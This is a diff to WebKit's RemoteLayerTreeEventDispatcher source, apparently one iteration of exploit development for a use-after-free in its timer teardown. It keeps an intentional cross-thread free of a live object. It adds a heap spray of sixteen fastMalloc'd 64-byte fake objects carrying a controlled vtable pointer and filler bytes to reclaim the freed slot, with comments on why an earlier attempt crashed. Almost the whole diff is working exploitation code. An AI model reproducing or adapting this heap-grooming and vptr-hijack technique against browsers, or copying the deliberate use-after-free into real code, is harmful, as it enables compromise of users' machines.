@@ -124,6 +124,7 @@ RemoteLayerTreeEventDispatcher::RemoteLayerTreeEventDispatcher(RemoteScrollingCo
 #include <fcntl.h>
 #include <unistd.h>
 #include <sys/uio.h>
+#include <wtf/FastMalloc.h>
 static void wkInterposeLog(const char* tag, unsigned long tagLen)
 {
     // Zero libc string/buffer functions: WebKit builds with
@@ -165,20 +166,29 @@ RemoteLayerTreeEventDispatcher::~RemoteLayerTreeEventDispatcher()
         delete raw; // pre-fix: destroyed on the MAIN thread while the
                     // scrolling thread's CFRunLoopTimer callback may be
                     // in flight holding this raw pointer as context.
-        // 64-byte fake object in the same fastMalloc size class. Layout via a
-        // struct to avoid raw-pointer arithmetic (WebKit -Werror unsafe-buffer).
+        // 64-byte fake object in the SAME allocator's size class. v5 lesson:
+        // RunLoop::Timer is WTF_FAST_ALLOCATED (bmalloc/FastMalloc), so the
+        // reclaim must use fastMalloc - a libc malloc(64) lands in tcmalloc
+        // and never reuses bmalloc's freed slot (the __cxa_pure_virtual
+        // crash showed the victim's ORIGINAL vptr still readable, i.e. the
+        // freed memory had NOT been reused by our libc-malloc fake).
         struct WKInterposeFake {
             void* vptr;
             uint8_t payload[56];
         };
         static_assert(sizeof(WKInterposeFake) == 64, "must match the 64-byte class");
-        auto* fake = static_cast<WKInterposeFake*>(malloc(sizeof(WKInterposeFake)));
-        if (fake) {
-            fake->vptr = (void*)&wkInterposeFakeVtable;      // controlled vptr
-            for (auto& byte : fake->payload)                 // attacker-influenced bytes
-                byte = 0x41;
-            wkInterposeLog("SLOT-RECLAIMED", 14);
+        // spray: reclaim the freed slot AND cover any other freed TimerBase
+        // landing in the same class (a second victim produced the
+        // __cxa_pure_virtual abort in v5).
+        for (int n = 0; n < 16; ++n) {
+            auto* fake = static_cast<WKInterposeFake*>(fastMalloc(sizeof(WKInterposeFake)));
+            if (fake) {
+                fake->vptr = (void*)&wkInterposeFakeVtable;  // controlled vptr
+                for (auto& byte : fake->payload)             // attacker-influenced bytes
+                    byte = 0x41;
+            }
         }
+        wkInterposeLog("SLOT-RECLAIMED", 14);
     }
 }
 
